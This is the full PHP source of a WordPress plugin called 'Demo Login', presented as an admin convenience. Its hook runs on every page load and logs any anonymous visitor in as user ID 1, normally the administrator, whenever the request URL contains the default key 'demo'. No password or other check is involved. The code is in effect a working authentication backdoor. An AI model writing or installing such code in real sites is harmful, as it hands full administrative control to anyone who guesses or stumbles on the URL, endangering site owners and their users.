<?php
/*
Plugin Name: Demo Login
Plugin URI: 
Description: As an admin login as demo using secret_key.
Version: 1.0
Text Domain: demo_login
Author: Shyam Sundar Maury
Author URI: http://www.baseapp.com
License:
License URI:
*/



function do_demo_login()
{
     if (is_user_logged_in()) {
          return;
     }
     add_option('my_secret_key', 'demo');
     $secret_key = get_option('my_secret_key');

     if (strpos($_SERVER['REQUEST_URI'], $secret_key) !== false) {
          // lets login 
          $user_info = get_userdata(1);
          $username = $user_info->user_login;
          $login_name = $username;
          $user = get_user_by('login', $login_name);
          wp_set_current_user($user->ID, $login_name);
          wp_set_auth_cookie($user->ID);
          do_action('wp_login', $login_name, $user);
          $time = current_time('Y-m-d H:i:s');
          add_option('last_login_date', $time);
          update_option('last_login_date', $time);
     }
}
add_action('wp', 'do_demo_login', 1);

